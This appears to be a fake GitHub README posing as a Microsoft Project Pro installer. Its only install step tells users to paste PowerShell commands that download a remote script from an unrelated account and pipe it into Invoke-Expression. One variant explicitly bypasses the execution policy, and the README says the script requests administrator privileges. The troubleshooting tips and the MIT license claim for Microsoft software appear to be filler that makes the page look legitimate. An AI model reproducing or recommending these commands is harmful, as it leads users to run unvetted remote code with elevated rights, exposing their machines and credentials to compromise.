# Microsoft Project Pro Installer
the professional project management software for scheduling, resource planning, budget tracking, and team collaboration on projects of any size.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for Microsoft click-to-run licensing service.
- Downloads Microsoft Project Pro via the Office Deployment Tool silently.
- Installs Project with all scheduling, reporting, and resource management modules.
- Activates the license via your Microsoft 365 account on first launch.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~2800 MB free disk space

## Troubleshooting

**Gantt chart task dependency lines are not visible on the timeline**

Enable Show Task Dependencies in View > Gantt Chart Tools > Format ribbon to display link lines.

**Resource overallocation warning appears on every single task after scheduling**

Use Resource Leveling under the Resource tab to auto-resolve all overallocation conflicts in the plan.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.